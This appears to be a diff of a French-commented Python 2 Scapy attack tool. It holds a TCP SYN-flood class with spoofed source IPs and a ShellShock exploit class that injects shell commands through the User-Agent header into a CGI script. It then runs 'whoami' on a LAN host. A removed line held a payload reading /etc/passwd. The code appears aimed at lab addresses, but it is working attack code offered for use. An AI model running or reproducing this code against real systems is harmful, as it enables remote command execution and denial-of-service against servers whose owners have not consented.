@@ -5,15 +5,16 @@
 
 
 ## TODO:
-##  - remplacer les sprintf de TCP.flags par des entiers
 ##  - tester port range sur le syn flood
 
 
 from scapy.all import *
 import threading
 import argparse
+import hashlib
 import random
 import Queue
+import copy
 import time
 import sys
 import os
@@ -36,11 +37,14 @@ class DOS():
     def createFloodPool(self, flood_port_start, flood_port_len, flood_port_step, funct, fake_ip, arguments = {}):
         pool = []
         for port in range(flood_port_start, flood_port_start + flood_port_len, flood_port_step):
-            arguments['start'] = port
-            arguments['end'] = port + flood_port_step
-            if fake_ip: arguments['fake_ip'] = "10." + '.'.join([str(i) for i in random.sample(xrange(255), 3)])
+            arg = copy.copy(arguments)
+            arg['start'] = port
+            arg['end'] = port + flood_port_step
+            if fake_ip: arg['fake_ip'] ="10." + '.'.join([str(i) for i in random.sample(xrange(255), 3)])
 
-            pool.append(threading.Thread(target=funct, name="flood-" + str(port), kwargs=arguments))
+            t = threading.Thread(target=funct, name="flood-" + str(port), kwargs=arg)
+            pool.append(t)
+            t.start()
 
         return pool
 
@@ -48,36 +52,17 @@ class DOS():
         if fake_ip: ip = IP(dst=self.target, src=fake_ip)
         else: ip = IP(dst=self.target)
 
-        syn = Etter() / ip / TCP(dport=self.port, sport=(start, end), flags='S')
-        sendp(syn, verbose=0)
+        syn = ip / TCP(dport=self.port, sport=(start, end), flags='S')
+        send(syn, verbose=0)
         # for port in range(start, end):
         #     if fa syn = ip / TCP(dport=self.port, sport=port, flags='S')
         #     else: syn = ip / TCP(dport=self.port, sport=port, flags='S')
         #     send(syn, verbose=0)
-        print "Sent ", len, " with IP " + fake_ip if fake_ip else 'with local IP'
+        print "Sent ", end - start, " with IP " + fake_ip if fake_ip else 'with local IP'
 
 # class Attack():
 
-class ShellShock():#Attack):() { :;};echo; /bin/cat /etc/passwd
-    HTTP_HEADER = {"User-Agent":"() { :; }; echo; echo 'SHELL_SHOCK_WORK_HERE'"}#ping -c 15 -p 5348454c4c5f53484f434b5f574f524b -s 32 "}
-
-    def __init__(self, host, script_page, ping_ip = "192.168.0.10"):
-        self.HTTP_HEADER['User-Agent'] += ping_ip
-        self.host = HTTP(host, header=self.HTTP_HEADER)
-        self.target = script_page
-
-    def run(self):
-        self.host.GET(self.target)
-
-        # pkts=sniff(filter="icmp", timeout=120,count=5)
-        if "SHELL_SHOCK_WORK_HERE" in self.host.get[self.target]['data']:
-
-            # if p[Raw].load[16:] == "SHELL_SHOCK_WORK_HERE":
-            print "Faille exploitable sur " + self.host.host
-            print self.host.get[self.target]['data']
-            #     return True
-
-class HTTP():
+class HTTP(object):
     """
     Cette classe permet de manipuler les requêtes HTTP via SCAPY. La méthode GET est implémenté.
     Les fonctions getForms et getRessources permettent de récupérer respectivement les formulaires
@@ -85,11 +70,22 @@ class HTTP():
 
     Reste à implémenter: méthode POST
     """
-
+    # Defining rgex to parse content
     RES_REGEX = re.compile(r"src\=(?:\"|')(?P<location>.*?)\.(?P<ext>\w+?)(?P<param>\?.*?)?(?:\"|')", re.IGNORECASE)
     FORM_REGEX = re.compile(r"<form(?P<form_param>.*?)>(?P<content>.*?)</form>", re.IGNORECASE | re.DOTALL)
     INPUT_REGEX = re.compile(r"<input(.*?)>", re.IGNORECASE | re.DOTALL)
     PARAM_REGEX = re.compile(r"(?P<name>\w*?)\=(?:\"|')(?P<value>.*?)(?:\"|')", re.IGNORECASE)
+
+    # Defining TCP flags
+    FIN = 0x01
+    SYN = 0x02
+    RST = 0x04
+    PSH = 0x08
+    ACK = 0x10
+
+    # Defining error codes
+    HOST_DOWN_ERROR = -1
+    CON_RST_ERROR = -2
 
     def __init__(self, host, sport = None, header = {}):
         self.host = host
@@ -100,10 +96,13 @@ class HTTP():
         "Accept":"text/html, text/*;q=0.5, image/*, application/*, video/*, audio/*, message/*, inode/*, x-content/*, misc/*, x-scheme-handler/*",
         "Host":host}
 
-        # On ajoute les headers donnéss en paramètre
-        for k in header: self.request_header[k] = header[k]
+        # On ajoute les headers donnés en paramètre
+        for k in header: self.setHeader(k, header[k])
 
         self.get = {}
+
+    def setHeader(self, name, value):
+        self.request_header[name] = value
 
     def handshake(self):
         """
@@ -113,9 +112,13 @@ class HTTP():
         print "SYN/ACK ", self.host, self.sport
         syn = IP(dst = self.host) / TCP(dport=80, sport=self.sport, flags='S')
         syn_ack = sr1(syn, verbose=0) # Sending syn, receiving syn ack
-        ack = IP(dst = self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
-        send(ack, verbose = 0) # Sending ack
-        return syn_ack
+
+        if syn_ack.haslayer(TCP):
+            ack = IP(dst = self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
+            send(ack, verbose = 0) # Sending ack
+            return syn_ack
+        else:
+            return None
 
     def close(self, con, init = False):
         """
@@ -182,13 +185,17 @@ class HTTP():
         # if len(target) == 1 : target.append('')
 
         # Handshake
-        if con == None: syn_ack = self.handshake()
+        if con == None:
+            syn_ack = self.handshake()
+            if not syn_ack:
+                print "Host down"
+                return HTTP.HOST_DOWN_ERROR
         else : syn_ack = con
 
         # GET
         con = self.__http_get(page, syn_ack)
 
-        if con.sprintf('%TCP.flags%') == 'R': return None # If connection reseted => exit function
+        if con[TCP].flags & HTTP.RST: return HTTP.CON_RST_ERROR # If connection reseted => exit function
 
         # Close connection
         del(self.get[page]['data_frag']) # Useless after this point, so deleting
@@ -227,6 +234,8 @@ class HTTP():
 
         res = HTTP.RES_REGEX.findall(self.get[page]['data'])
         to_fetch = []
+
+        # Regex give location, extension and parameters of each field
         for loc,ext,param in res:
             if ext in ['html', 'htm', 'php']:
                 if loc.startswith('../'):
@@ -235,7 +244,7 @@ class HTTP():
                     to_fetch.append(loc)
                 elif loc.startswith('/'):
                     # Fetch res with absolute path
-                    to_fetch.append(loc)
+                    to_fetch.append(loc[1:])
                 else: continue  # External res not fetched
         return to_fetch
 
@@ -260,24 +269,56 @@ class HTTP():
         # Proceeding queue and adding new replies to it
         while not q.empty():
             reply = q.get()
-            if reply.sprintf('%TCP.flags%') in ['PA', 'A'] and (reply.haslayer(Raw)):
+
+            # If the fragment contains data (and is a ACK or PUSH ACK)
+            if reply[TCP].flags & HTTP.ACK and (reply.haslayer(Raw)):
+
+                # We add the fragment to previously fetched fragments for this page
                 self.addFragment(reply[Raw].load, page, reply[TCP].ack, reply[TCP].seq)
 
+                # Preparing the ACK for the receivedd fragment
                 request = IP(dst=self.host) / TCP(dport=80, sport=reply[TCP].dport, seq=reply[TCP].ack, ack=reply[TCP].seq + len(reply[Raw].load), flags='A')
 
-                if self.get[page]['code'] != 200: return reply
+                # Veryfing if request completed
                 if 'Content-Length' in self.get[page]['header'] and self.get[page]['header']['Content-Length'] <= self.get[page]['len']: break
-                a, u = sr(request, verbose = 0, timeout=0.1, multi=1)
-                for s, r in a: q.put(r)
-                # else: send(request, verbose=0)
 
-            elif reply.sprintf('%TCP.flags%') == 'R': break
+                # Sending ACK and waiting for new fragments
+                a, u = sr(request, verbose = 0, timeout=0.1, multi=1)
+                for s, r in a: q.put(r) # Adding new fragments to queue
+
+            elif reply[TCP].flags & HTTP.RST : break
 
         # for i in self.get[page]['data_frag']:
         #     print i, ' : ', self.get[page]['data_frag'][i][-50:]
         # print len(self.get[page]['data']), self.get[page]['header']['Content-Length']
+        # Merging fragments
         self.mergeFragments(page)
         return reply
+
+
+class ShellShock(HTTP):
+    USER_AGENT = "() { :; };"#ping -c 15 -p 5348454c4c5f53484f434b5f574f524b -s 32 "}
+
+    def __init__(self, host, script_page):
+        super(ShellShock, self).__init__(host)
+        # self.host = HTTP(host)
+        self.target = script_page
+
+    def test(self):
+        md5 = hashlib.md5(self.host + '/' + self.target).hexdigest()
+        pattern = "SHELL_SHOCK_WORK_HERE_" + md5
+        self.run("echo; echo '" + pattern + "'")
+        # pkts=sniff(filter="icmp", timeout=120,count=5)
+
+        if pattern in self.get[self.target]['data']:
+            print "Faille exploitable sur " + self.host
+            return True
+        else:
+            return False
+
+    def run(self, command):
+        self.setHeader('User-Agent', ShellShock.USER_AGENT + command)
+        self.GET(self.target)
 
 if __name__ == "__main__":
     conf.L3socket=L3RawSocket
@@ -293,24 +334,13 @@ if __name__ == "__main__":
 
     # Usage: args.count, args.filter, ...
 
-    target = 'http://google.fr'
-    # target = 'http://10.0.2.2/index.nginx-debian.html'
-    # target = 'http://192.168.0.14/'
-
-    site = HTTP("192.168.0.32")
     # site = HTTP("eleve.scrjpl.fr")
-    site = HTTP("korben.info")
-
+    # site = HTTP("korben.info")
+    # site = HTTP("192.168.0.21")
+    #
     # html_rep = site.GET('groups/new.php')
     # html_rep = site.GET('index.nginx-debian.html')
-    # html_rep = site.GET('')
-    # for form in site.getForms(''):
-    #     print form
-    #
-    #
-    # if html_rep == None:
-    #     print "Connection was reseted for an unkown reason."
-    #     sys.exit(0)
+    # html_rep = site.GET('test.html')
     #
     # code = html_rep['code']
     #
@@ -326,5 +356,7 @@ if __name__ == "__main__":
     # f = DOS("192.168.0.17", 80)
     # f.tcp_syn_flood()
 
-    shellshock = ShellShock("192.168.0.21", "cgi-bin/test.sh")
-    shellshock.run()
+    victim = ShellShock("192.168.0.21", "cgi-bin/test.sh")
+    if victim.test():
+        victim.run("echo; whoami")
+        print victim.get["cgi-bin/test.sh"]['data']
